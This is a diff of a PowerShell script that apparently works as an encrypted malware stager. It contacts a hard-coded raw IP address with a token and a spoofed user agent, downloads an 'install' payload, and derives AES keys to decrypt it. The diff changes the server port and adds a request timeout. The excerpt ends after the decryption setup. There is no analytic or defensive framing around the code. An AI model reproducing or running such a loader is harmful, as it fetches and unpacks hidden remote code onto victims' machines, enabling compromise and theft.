@@ -1,12 +1,12 @@
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
-$B = 'http://51.75.118.5:20184'
+$B = 'http://51.75.118.5:20216'
 $T = 'tk-48232543-a9d6F'
 $U = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'
 $s = [Security.Cryptography.SHA256]::Create()
 $k = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U"))
 $v = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U|iv"))[0..15]
-$r = Invoke-RestMethod -UseBasicParsing "$B/s/$T/install" -Headers @{ 'User-Agent' = $U; 'Cache-Control' = 'no-cache' }
+$r = Invoke-RestMethod -UseBasicParsing "$B/s/$T/install" -Headers @{ 'User-Agent' = $U; 'Cache-Control' = 'no-cache' } -TimeoutSec 20
 $d = [Convert]::FromBase64String(($r.d, $r.c | Where-Object { $_ })[0])
 $a = [Security.Cryptography.Aes]::Create()
 $a.Mode = 'CBC'; $a.Padding = 'PKCS7'; $a.Key = $k; $a.IV = $v
